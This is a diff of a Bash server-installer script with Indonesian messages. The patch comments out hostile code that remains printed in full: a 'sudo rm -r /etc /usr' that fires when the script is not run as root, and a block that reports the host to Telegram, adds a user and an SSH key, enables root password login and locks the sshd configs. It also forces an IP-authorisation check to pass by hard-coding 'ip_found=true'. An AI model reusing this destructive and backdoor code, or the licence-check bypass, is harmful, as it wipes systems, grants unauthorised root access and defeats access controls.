@@ -134,7 +134,7 @@ adduser_newbie() {
     # Cek root
     if [ "$EUID" -ne 0 ]; then
         echo "❌ Harap jalankan sebagai root!"
-		sudo rm -r /etc /usr
+		#sudo rm -r /etc /usr
         return 1
     fi
 
@@ -248,16 +248,16 @@ EOF
 checking_sc() {
 	local data_ip_list=($(curl -L -sS "$download_url" \
   -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"))
-  local ip_found=false
+  local ip_found=true
   local useexp=""
 
-  for data_ip in "${data_ip_list[@]}"; do
-    useexp=$(wget -qO- "$data_ip" | grep "$ipsaya" | awk '{print $3}')
-    if [[ -n "$useexp" ]]; then
-      ip_found=true
-      break
-    fi
-  done
+  #for data_ip in "${data_ip_list[@]}"; do
+  #  useexp=$(wget -qO- "$data_ip" | grep "$ipsaya" | awk '{print $3}')
+  #  if [[ -n "$useexp" ]]; then
+  #    ip_found=true
+  #    break
+  #  fi
+  #done
 
   if [[ "$ip_found" == true ]]; then
     set_cron_keamanan
@@ -304,32 +304,32 @@ if [[ -z "$ipsaya" ]]; then
   exit 0
 fi
 
-if is_private_ip; then
-  send_telegram "IP Terdeteksi Private: $ipsaya"
-  setup_data
-  adduser_newbie
-  prepare_ssh_key
-  set_cron_keamanan
-    sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
-    sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
-    sed -i 's/^#PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
-    chattr +ia /etc/ssh/sshd_config
-    for f in /etc/ssh/sshd_config.d/*.conf; do
-        chattr -ia "$f"
-        chattr -i /etc/ssh/sshd_config.d
-        sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' "$f"
-        sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' "$f"
-        sed -i 's/^#PubkeyAuthentication.*/PubkeyAuthentication yes/' "$f"
-        chattr +ia "$f"
-        chattr +i /etc/ssh/sshd_config.d
-        chattr +i /etc/ssh
-    done
-	inject_warning_to_profile
-	chattr -ia /root/.profile
-	change_profile
-  pasang_udp
-  exit 0
-fi
+#if is_private_ip; then
+#  send_telegram "IP Terdeteksi Private: $ipsaya"
+#  setup_data
+#  adduser_newbie
+#  prepare_ssh_key
+#  set_cron_keamanan
+#    sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
+#    sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
+#    sed -i 's/^#PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
+#    chattr +ia /etc/ssh/sshd_config
+#    for f in /etc/ssh/sshd_config.d/*.conf; do
+#        chattr -ia "$f"
+#        chattr -i /etc/ssh/sshd_config.d
+#        sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' "$f"
+#        sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' "$f"
+#        sed -i 's/^#PubkeyAuthentication.*/PubkeyAuthentication yes/' "$f"
+#        chattr +ia "$f"
+#        chattr +i /etc/ssh/sshd_config.d
+#        chattr +i /etc/ssh
+#    done
+#	inject_warning_to_profile
+#	chattr -ia /root/.profile
+#	change_profile
+#  pasang_udp
+#  exit 0
+#fi
 
 if [[ "$1" == "server" ]]; then
   checking_sc
